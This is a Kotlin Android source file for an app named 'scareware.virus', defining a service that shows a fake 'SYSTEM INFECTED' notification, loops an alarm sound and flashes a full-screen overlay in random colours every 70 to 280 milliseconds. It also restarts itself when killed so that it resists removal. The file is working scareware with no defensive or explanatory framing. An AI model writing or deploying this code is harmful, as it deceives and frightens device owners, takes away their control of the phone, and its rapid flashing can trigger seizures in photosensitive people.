package com.scareware.virus

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import androidx.core.app.NotificationCompat
import kotlin.random.Random

class ScareService : Service() {

    private var mediaPlayer: MediaPlayer? = null
    private var windowManager: WindowManager? = null
    private var flashView: View? = null
    private val handler = Handler(Looper.getMainLooper())
    private var flashRunnable: Runnable? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, buildNotification())
        startSound()
        startScreenFlash()
        return START_STICKY // restart if killed
    }

    private fun buildNotification(): Notification {
        val channelId = "scare_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Alert",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }

        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("⚠ SYSTEM INFECTED")
            .setContentText("Virus is active...")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun startSound() {
        if (mediaPlayer != null) return
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
            mediaPlayer?.isLooping = true
            mediaPlayer?.setVolume(1f, 1f)
            mediaPlayer?.start()
        } catch (e: Exception) {
            try {
                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(this@ScareService, uri)
                    setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                    isLooping = true
                    prepare()
                    start()
                }
            } catch (_: Exception) {}
        }
    }

    private fun startScreenFlash() {
        if (flashView != null) return
        try {
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.TOP or Gravity.START

            flashView = FrameLayout(this).apply {
                setBackgroundColor(Color.BLACK)
                alpha = 0.0f
            }

            windowManager?.addView(flashView, params)

            val colors = intArrayOf(
                Color.BLACK, Color.RED, Color.WHITE,
                Color.YELLOW, Color.rgb(200, 0, 0)
            )

            flashRunnable = object : Runnable {
                override fun run() {
                    flashView?.let { v ->
                        v.setBackgroundColor(colors[Random.nextInt(colors.size)])
                        v.alpha = if (Random.nextBoolean()) 0.85f else 0.15f
                    }
                    handler.postDelayed(this, Random.nextLong(70, 280))
                }
            }
            handler.post(flashRunnable!!)
        } catch (_: Exception) {
            // Overlay permission not granted - still keep sound
        }
    }

    override fun onDestroy() {
        // Try to restart self
        val restart = Intent(this, ScareService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart)
        } else {
            startService(restart)
        }
        mediaPlayer?.release()
        mediaPlayer = null
        flashRunnable?.let { handler.removeCallbacks(it) }
        try {
            flashView?.let { windowManager?.removeView(it) }
        } catch (_: Exception) {}
        super.onDestroy()
    }
}
